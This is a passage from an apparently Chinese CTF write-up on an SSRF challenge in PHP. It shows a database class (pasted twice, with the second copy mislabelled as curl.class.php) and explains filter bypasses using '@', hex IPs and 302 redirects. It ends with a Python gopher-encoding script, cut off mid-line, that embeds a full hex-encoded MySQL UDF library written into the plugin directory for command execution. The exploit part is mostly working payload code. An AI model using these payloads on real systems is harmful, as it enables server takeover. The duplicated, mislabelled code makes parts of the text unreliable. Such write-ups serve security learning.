+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $_host;</span><br><span class="line">        <span class="keyword">protected</span> $_user;</span><br><span class="line">        <span class="keyword">protected</span> $_pass;</span><br><span class="line">        <span class="keyword">protected</span> $_dbName;</span><br><span class="line">        <span class="keyword">protected</span> $conn = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> $conf</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_host = $conf[<span class="string">&#x27;dbhost&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_user = $conf[<span class="string">&#x27;dbuser&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_pass = $conf[<span class="string">&#x27;dbpass&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dbName = $conf[<span class="string">&#x27;dbname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( is_null(<span class="keyword">$this</span>-&gt;conn) ) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;db_connect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">db_connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;_host, <span class="keyword">$this</span>-&gt;_user, <span class="keyword">$this</span>-&gt;_pass, <span class="keyword">$this</span>-&gt;_dbName);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;conn-&gt;connect_errno)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Connection Error: &#x27;</span>.<span class="keyword">$this</span>-&gt;conn-&gt;connect_errno);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">check_url_exist</span>(<span class="params">$url</span>) </span>&#123;</span><br><span class="line">            $stmt = <span class="keyword">$this</span>-&gt;conn-&gt;prepare(<span class="string">&quot;SELECT `url` FROM `urls` WHERE `url` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">            $stmt-&gt;bind_param(<span class="string">&quot;s&quot;</span>, $url);</span><br><span class="line">            $stmt-&gt;execute();</span><br><span class="line">            $stmt-&gt;store_result();</span><br><span class="line">            $count = $stmt-&gt;num_rows;</span><br><span class="line">            <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_url</span>(<span class="params">$resArray</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;check_url_exist($resArray[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $stmt = <span class="keyword">$this</span>-&gt;conn-&gt;prepare(<span class="string">&quot;INSERT INTO `urls` (`url`, `status`) VALUES (?, ?);&quot;</span>);</span><br><span class="line">            $stmt-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, $resArray[<span class="string">&#x27;url&#x27;</span>], $resArray[<span class="string">&#x27;status&#x27;</span>]);</span><br><span class="line">            $stmt-&gt;execute();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>curl.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $_host;</span><br><span class="line">        <span class="keyword">protected</span> $_user;</span><br><span class="line">        <span class="keyword">protected</span> $_pass;</span><br><span class="line">        <span class="keyword">protected</span> $_dbName;</span><br><span class="line">        <span class="keyword">protected</span> $conn = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> $conf</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_host = $conf[<span class="string">&#x27;dbhost&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_user = $conf[<span class="string">&#x27;dbuser&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_pass = $conf[<span class="string">&#x27;dbpass&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dbName = $conf[<span class="string">&#x27;dbname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( is_null(<span class="keyword">$this</span>-&gt;conn) ) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;db_connect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">db_connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;_host, <span class="keyword">$this</span>-&gt;_user, <span class="keyword">$this</span>-&gt;_pass, <span class="keyword">$this</span>-&gt;_dbName);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;conn-&gt;connect_errno)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Connection Error: &#x27;</span>.<span class="keyword">$this</span>-&gt;conn-&gt;connect_errno);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">check_url_exist</span>(<span class="params">$url</span>) </span>&#123;</span><br><span class="line">            $stmt = <span class="keyword">$this</span>-&gt;conn-&gt;prepare(<span class="string">&quot;SELECT `url` FROM `urls` WHERE `url` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">            $stmt-&gt;bind_param(<span class="string">&quot;s&quot;</span>, $url);</span><br><span class="line">            $stmt-&gt;execute();</span><br><span class="line">            $stmt-&gt;store_result();</span><br><span class="line">            $count = $stmt-&gt;num_rows;</span><br><span class="line">            <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_url</span>(<span class="params">$resArray</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;check_url_exist($resArray[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $stmt = <span class="keyword">$this</span>-&gt;conn-&gt;prepare(<span class="string">&quot;INSERT INTO `urls` (`url`, `status`) VALUES (?, ?);&quot;</span>);</span><br><span class="line">            $stmt-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, $resArray[<span class="string">&#x27;url&#x27;</span>], $resArray[<span class="string">&#x27;status&#x27;</span>]);</span><br><span class="line">            $stmt-&gt;execute();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php中常见可能产生ssrf的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl()</span><br><span class="line"></span><br><span class="line">fsockopen()</span><br><span class="line"></span><br><span class="line">file_get_contents()</span><br><span class="line"></span><br><span class="line">fopen()</span><br><span class="line"></span><br><span class="line">readfile()</span><br><span class="line"></span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>
+
+<p>相关PHP内置类</p>
+<p><code>SoapClient</code></p>
+<p>index.php调用<code>filterURL</code>对传入的url检测</p>
+<p>其中<code>filterURL</code>只对第一次传入的域名或者ip判断了，不过<code>isInnerIP</code>可以绕过</p>
+<ol>
+<li><strong><strong>“@”符号绕过</strong></strong></li>
+</ol>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224147-931436.png" alt="Untitled"></p>
+<ol>
+<li>16进制</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0x7F000001</a></p>
+<p>但是上面两个方法都限制了协议是http，但是通过302跳转可以跳过协议限制</p>
+<p>而且代码中对location中的ip没有验证</p>
+<p>vps上放</p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224149-929726.png" alt="Untitled"></p>
+<p>可以利用file、http、gopher、dict等</p>
+<p><strong><strong><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321535.html">关于SSRF和多种绕过方式</a></strong></strong></p>
+<p>通过index.php可以知道mysql是没有密码的，因此可以利用gopher打mysql</p>
+<p>谨慎使用gopherus这个工具(nnd，我window发现他编码一长就会编码不全)</p>
+<p>这里提供一个python2 gopher协议编码的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">&quot;\033[31m&quot;</span>+<span class="string">&quot;For making it work username should not be password protected!!!&quot;</span>+ <span class="string">&quot;\033[0m&quot;</span></span><br><span class="line">user = raw_input(<span class="string">&quot;\033[96m&quot;</span> +<span class="string">&quot;\nGive MySQL username: &quot;</span> + <span class="string">&quot;\033[0m&quot;</span>) </span><br><span class="line">encode_user = user.encode(<span class="string">&quot;hex&quot;</span>) </span><br><span class="line">user_length = len(user) </span><br><span class="line">temp = user_length - <span class="number">4</span> </span><br><span class="line">length = (chr(<span class="number">0xa3</span>+temp)).encode(<span class="string">&quot;hex&quot;</span>) </span><br><span class="line">dump = length + <span class="string">&quot;00000185a6ff0100000001210000000000000000000000000000000000000000000000&quot;</span> </span><br><span class="line">dump += encode_user </span><br><span class="line">dump += <span class="string">&quot;00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c&quot;</span> </span><br><span class="line">dump += <span class="string">&quot;69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d&quot;</span> </span><br><span class="line">dump += <span class="string">&quot;067838365f36340c70726f6772616d5f6e616d65056d7973716c&quot;</span> </span><br><span class="line">query = raw_input(<span class="string">&quot;\033[96m&quot;</span> +<span class="string">&quot;Give query to execute: &quot;</span>+ <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment"># query=&quot;SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;&quot;</span></span><br><span class="line">auth = dump.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line"> a = [s[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)] </span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;gopher://127.0.0.1:3306/_%&quot;</span> + <span class="string">&quot;%&quot;</span>.join(a) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>(<span class="params">query</span>):</span></span><br><span class="line">	<span class="keyword">if</span>(query.strip()!=<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">	  query = query.encode(<span class="string">&quot;hex&quot;</span>) </span><br><span class="line">	  query_length = <span class="string">&#x27;&#123;:06x&#125;&#x27;</span>.format((int((len(query) / <span class="number">2</span>) + <span class="number">1</span>))) </span><br><span class="line">	  query_length = query_length.decode(<span class="string">&#x27;hex&#x27;</span>)[::<span 